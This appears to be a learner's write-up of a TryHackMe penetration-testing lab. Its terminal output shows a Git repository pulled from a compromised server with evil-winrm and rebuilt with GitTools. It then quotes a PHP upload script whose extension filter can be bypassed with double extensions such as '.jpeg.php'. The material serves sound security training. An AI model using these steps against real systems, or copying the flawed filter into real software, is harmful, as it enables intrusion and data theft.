+[+] Found commit: 345ac8b236064b431fa43f53d91c98c4834ef8f3
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/css/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/css/bootstrap.min.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/css/font-awesome.min.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/css/style.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/favicon.png
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/fonts
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/fonts/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/fonts/FontAwesome.otf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/fonts/fontawesome-webfont.eot
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/fonts/fontawesome-webfont.svg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/fonts/fontawesome-webfont.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/fonts/fontawesome-webfont.woff
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/fonts/fontawesome-webfont.woff2
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/img
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/img/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/img/img-profile.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/img/portfolio-1.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/img/portfolio-2.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/img/portfolio-3.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/img/portfolio-4.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/img/preloader.gif
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/img/puff.svg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/index.html
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/js
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/js/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/js/bootstrap.min.js
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/js/jquery-2.1.4.min.js
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/js/scripts.js
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/css/Andika.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/css/styles.css
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/fonts
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/fonts/AndikaNewBasic-Bold.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/fonts/AndikaNewBasic-BoldItalic.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/fonts/AndikaNewBasic-Italic.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/fonts/AndikaNewBasic-Regular.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/fonts/Andika_New_Basic.zip
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/fonts/OFL.txt
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/imgs
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/assets/imgs/ruby.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3/resources/index.php
+[+] Found commit: 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/css/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/css/bootstrap.min.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/css/font-awesome.min.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/css/style.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/favicon.png
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/fonts
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/fonts/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/fonts/FontAwesome.otf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/fonts/fontawesome-webfont.eot
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/fonts/fontawesome-webfont.svg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/fonts/fontawesome-webfont.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/fonts/fontawesome-webfont.woff
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/fonts/fontawesome-webfont.woff2
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/img
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/img/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/img/img-profile.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/img/portfolio-1.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/img/portfolio-2.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/img/portfolio-3.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/img/portfolio-4.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/img/preloader.gif
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/img/puff.svg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/index.html
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/js
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/js/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/js/bootstrap.min.js
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/js/jquery-2.1.4.min.js
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/js/scripts.js
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/css/Andika.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/css/styles.css
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/fonts
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/fonts/AndikaNewBasic-Bold.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/fonts/AndikaNewBasic-BoldItalic.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/fonts/AndikaNewBasic-Italic.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/fonts/AndikaNewBasic-Regular.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/fonts/Andika_New_Basic.zip
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/fonts/OFL.txt
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/imgs
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/imgs/ruby.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/index.php
+[+] Found commit: 70dde80cc19ec76704567996738894828f4ee895
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/css/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/css/bootstrap.min.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/css/font-awesome.min.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/css/style.css
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/favicon.png
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/fonts
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/fonts/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/fonts/FontAwesome.otf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/fonts/fontawesome-webfont.eot
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/fonts/fontawesome-webfont.svg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/fonts/fontawesome-webfont.ttf
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/fonts/fontawesome-webfont.woff
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/fonts/fontawesome-webfont.woff2
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/img
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/img/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/img/img-profile.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/img/portfolio-1.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/img/portfolio-2.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/img/portfolio-3.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/img/portfolio-4.jpg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/img/preloader.gif
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/img/puff.svg
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/index.html
+[+] Found folder: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/js
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/js/.DS_Store
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/js/bootstrap.min.js
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/js/jquery-2.1.4.min.js
+[+] Found file: /home/witty/Downloads/CVE-2019-15107/Website.git/Website/2-70dde80cc19ec76704567996738894828f4ee895/js/scripts.js
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107/Website.git/Website]
+└─$ ll    
+total 12
+drwxr-xr-x 7 witty witty 4096 Jun 16 10:46 0-345ac8b236064b431fa43f53d91c98c4834ef8f3
+drwxr-xr-x 7 witty witty 4096 Jun 16 10:46 1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
+drwxr-xr-x 6 witty witty 4096 Jun 16 10:46 2-70dde80cc19ec76704567996738894828f4ee895
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107/Website.git/Website]
+└─$ separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
+
+=======================================
+0-345ac8b236064b431fa43f53d91c98c4834ef8f3
+tree c4726fef596741220267e2b1e014024b93fced78
+parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
+author twreath <me@thomaswreath.thm> 1609614315 +0000
+committer twreath <me@thomaswreath.thm> 1609614315 +0000
+
+Updated the filter
+
+=======================================
+1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
+tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
+parent 70dde80cc19ec76704567996738894828f4ee895
+author twreath <me@thomaswreath.thm> 1608592351 +0000
+committer twreath <me@thomaswreath.thm> 1608592351 +0000
+
+Initial Commit for the back-end
+
+=======================================
+2-70dde80cc19ec76704567996738894828f4ee895
+tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
+author twreath <me@thomaswreath.thm> 1604849458 +0000
+committer twreath <me@thomaswreath.thm> 1604849458 +0000
+
+Static Website Commit
+
+=======================================
+```
+Use your WinRM access to look around the Git Server. What is the absolute path to the `Website.git` directory?
+Look at the directories under the root directory (C:\). Do any of these look unusual?
+*C:\GitStack\repositories\Website.git*
+Use `evil-winrm` to download the entire directory.
+From the directory above Website.git, use:
+`download PATH\TO\Website.git`
+Be warned -- this will take a while, but should complete after a minute or two!
+_**Note:** You may need to specify the local path as well as the absolute path to the Website.git directory!_
+Completed
+Exit out of evil-winrm -- you should see that a new directory called Website.git has been created locally. If you enter into this directory you will see an oddly named subdirectory (the same as the answer to question 1 of this task).
+Rename this _subdirectory_ to `.git`.
+Completed
+Git repositories always contain a special directory called `.git` which contains all of the meta-information for the repository. This directory can be used to fully recreate a readable copy of the repository, including things like version control and branches. If the repository is local then this directory would be a part of the full repository -- the rest of which would be the items of the repository in a human-readable format; however, as the `.git` directory is enough to recreate the repository in its entirety, the server doesn't need to store the easily readable versions of the files. This means that what we've downloaded isn't actually the full repository, so much as the building blocks we can use to recreate the repo (which is exactly what happens when using `git clone` to create a local copy of a repo!).
+In order to extract the information from the repository, we use a suite of tools called GitTools.
+Clone the GitTools repository into your current directory using:
+`git clone https://github.com/internetwache/GitTools`
+The GitTools repository contains three tools:
+- **Dumper** can be used to download an exposed `.git` directory from a website should the owner of the site have forgotten to delete it
+- **Extractor** can be used to take a local `.git` directory and recreate the repository in a readable format. This is designed to work in conjunction with the Dumper, but will also work on the repo that we stole from the Git server. Unfortunately for us, whilst Extractor _will_ give us each commit in a readable format, it will not sort the commits by date
+- **Finder** can be used to search the internet for sites with exposed `.git` directories. This is significantly less useful to an ethical hacker, although may have applications in bug bounty programmes
+Let's use Extractor to obtain a readable format of the repository!
+The syntax for Extractor is as follows:
+`./extractor.sh REPO_DIR DESTINATION_DIR`
+This is slightly confusing, so explaining each option:
+- The `REPO_DIR` is the directory _containing_ the `.git` directory for the repository. Note that this is not the `.git` directory itself. Extractor looks for a `.git` directory _inside_ the specified directory (which is why we had to change the original name of the directory to ".git")
+- The `DESTINATION_DIR` is the subdirectory into which the repository will be created
+For example, if we cloned the GitTools repo into the same directory as the `.git` directory we downloaded from the Git Server, we can extract the contents of the stolen repository into a subdirectory called "Website" using:
+`GitTools/Extractor/extractor.sh . Website`
+This uses the current directory "`.`" (as the parent of the `.git` directory) and extracts into a newly created `Website` subdirectory.
+![Extracting the git respository. First cloning GitTools, then running the extractor on the current directory.](https://assets.tryhackme.com/additional/wreath-network/6f1a257091d4.png)
+Recreate the repository -- we will perform some code analysis in the next task!
+Completed
+Let's head into the newly recreated repository. We see three directories:
+![Showing the three commits as directories in the Website folder](https://assets.tryhackme.com/additional/wreath-network/e1479598dc52.png)
+Each of these corresponds to a commit; however, as mentioned previously, these are not sorted by date...
+It's up to us to piece together the order of the commits. Fortunately there are only three commits in this repository, and each commit comes with a `commit-meta.txt` file which we can use to get an idea of the order.
+We could just cat each of these files out separately, but we may as well do it the fancy way with a bash one-liner:
+`separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"`
+This gives us the three `commit-meta.txt` files in a nicely formatted order:
+![Formatted commit history using the one-liner above](https://assets.tryhackme.com/additional/wreath-network/fcd4bcda0749.png)
+Here we can see three commit messages: `Updated the filter`, `Initial Commit for the back-end`, and `Static Website Commit`.
+_**Note:** The number at the start of these directories is arbitrary, and depends on the order in which GitTools extracts the directories. What matters is the hash at the end of the filename._
+Logically speaking, we can guess that these are currently in reverse order based on the commit message; however, we could also check the parent value of each commit. Starting at the only commit without a parent (which must be the initial commit), we can work down the tree in stages like so:
+![Demonstrating the technique of matching a node name to the parent node specified in one other node](https://assets.tryhackme.com/additional/wreath-network/3a87596c906b.png)
+We find the commit that has no parent (`70dde80cc19ec76704567996738894828f4ee895`), and check to see which of the other commits specifies it as a direct parent (`82dfc97bec0d7582d485d9031c09abcb5c6b18f2`). We then repeat the process to find the full commit order:
+1. 70dde80cc19ec76704567996738894828f4ee895
+2. 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
+3. 345ac8b236064b431fa43f53d91c98c4834ef8f3
+We _could_ also do this by checking the timestamps attached to the commits (in UNIX format, after the emails); however, it is possible to fake these. Feel free to use them, but be aware that they may not always be accurate.
+---
+If that didn't make sense, don't worry!
+The short version is: the most up to date version of the site stored in the Git repository is in the `NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3` directory.
+Completed
+### Task 36  Personal PC Website Code Analysis
+[**Video**](https://youtu.be/rowvOkZVsPQ)
+Head into the `NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3/` directory.
+The `index.html` file isn't promising -- realistically we need some PHP, which we identified as the webserver's back-end language in Task 31.
+Let's look for PHP files using `find`:
+`find . -name "*.php"`
+Only one result:
+`./resources/index.php`
+![Demonstration of finding the PHP file](https://assets.tryhackme.com/additional/wreath-network/1eba548b724f.png)
+If we're going to find a serious vulnerability, it's going to have to be here!
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~/…/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3]
+└─$ find . -name "*.php"
+./resources/index.php
+
+┌──(witty㉿kali)-[~/…/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3]
+└─$ cat resources/index.php | grep Walker
+		  - Phone Mrs Walker about the neighbourhood watch meetings
+
+──(witty㉿kali)-[~/…/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3]
+└─$ cat resources/index.php | grep filter
+		  - Upgrade the filter on this page. Can't rely on basic auth for everything
+
+──(witty㉿kali)-[~/…/CVE-2019-15107/Website.git/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3]
+└─$ cat resources/index.php 
+<?php
+
+	if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
+		$target = "uploads/".basename($_FILES["file"]["name"]);
+		$goodExts = ["jpg", "jpeg", "png", "gif"];
+		if(file_exists($target)){
+			header("location: ./?msg=Exists");
+			die();
+		}
+		$size = getimagesize($_FILES["file"]["tmp_name"]);
+		if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
+			header("location: ./?msg=Fail");
+			die();
+		}
+		move_uploaded_file($_FILES["file"]["tmp_name"], $target);	
+		header("location: ./?msg=Success");
+		die();
+	} else if ($_SERVER["REQUEST_METHOD"] == "post"){
+		header("location: ./?msg=Method");
+	}
+
+	if(isset($_GET["msg"])){
+		$msg = $_GET["msg"];
+		switch ($msg) {
+			case "Success":
+				$res = "File uploaded successfully!";
+				break;
+			case "Fail":
+				$res = "Invalid File Type";
+				break;
+			case "Exists":
+				$res = "File already exists";
+				break;
+			case "Method":
+				$res = "No file send";
+				break;
+		
+		}
+	}
+?>
+<!DOCTYPE html>
+<html lang=en>
+	<!-- ToDo:
+		  - Finish the styling: it looks awful
+		  - Get Ruby more food. Greedy animal is going through it too fast
+		  - Upgrade the filter on this page. Can't rely on basic auth for everything
+		  - Phone Mrs Walker about the neighbourhood watch meetings
+	-->
+	<head>	
+		<title>Ruby Pictures</title>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<link rel="stylesheet" type="text/css" href="assets/css/Andika.css">
+		<link rel="stylesheet" type="text/css" href="assets/css/styles.css">
+	</head>
+	<body>
+		<main>
+			<h1>Welcome Thomas!</h1>
+			<h2>Ruby Image Upload Page</h2>
+			<form method="post" enctype="multipart/form-data">
+				<input type="file" name="file" id="fileEntry" required, accept="image/jpeg,image/png,image/gif">
+				<input type="submit" name="upload" id="fileSubmit" value="Upload">
+			</form>
+			<p id=res><?php if (isset($res)){ echo $res; };?></p>
+		</main>	
+	</body>
+</html>
+```
+Read through the file.
+What does Thomas have to phone Mrs Walker about?
+Read the to-do list in the file.
+*neighbourhood watch meetings*
+This appears to be a file-upload point, so we might have the opportunity for a filter bypass here!
+Additionally, the to-do list at the bottom of the page not only gives us an insight into Thomas' upcoming schedule, but it also gives us an idea about the protections around the page itself.
+Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?
+Point 3 in the to-do list.
+*basic auth*
+Let's turn our attention to the code itself now.
+Reading through the PHP code, it appears that there are _two_ filters in place here, plus a simple check to see if the file already exists.
+These filters are rolled together into one block of PHP code:
+`$size = getimagesize($_FILES["file"]["tmp_name"]);   if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){       header("location: ./?msg=Fail");       die();   }`
+The first line here uses a classic PHP technique used to see if a file is an image. In short, images have their dimensions encoded in their exif data. The `getimagesize()` method returns these dimensions if the file is genuinely an image, or the boolean value `False` if the file is not an image. This is more difficult to bypass than other filters, but it's far from impossible to do so.
+The second line is an If statement which checks two conditions. If either condition fails (indicated by the "Or" operator: `||`) then the script will redirect with a Failure message. The second condition is easy: `!$size` just checks to see if the `$size` variable contains the boolean `False`. The first condition may need to be broken down a little.
+`!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)`
+There are two functions in play here: `in_array()` and `explode()`. Let's start with the innermost function and work out the way:
+`explode(".", $_FILES["file"]["name"])[1]`
+The `explode()` function is used to split a string at the specified character. Here it's being used to split the name of the file we uploaded at each period (`.`). From this we can (rightly) assume that this is a file-extension filter. As an example, if we were to upload a file called `image.jpeg`, this function would return a list: `["image", "jpeg"]`. As the filter only really needs the file-extension, it then grabs the second item from the list (`[1]`), remembering that lists start at 0.
+This, unfortunately, leads to a big problem. What happens if there's more than one file extension? Let's say we upload a file called `image.jpeg.php`. The filename gets split into `["image", "jpeg", "php"]`, but only the `jpeg` (as the second element in the list) gets passed into the filter!
+Looking at the outer function now (and replacing the inner function with a placeholder of `EXPLODE_RESULTS`):
+`!in_array(EXPLODE_RESULTS, $goodExts)`
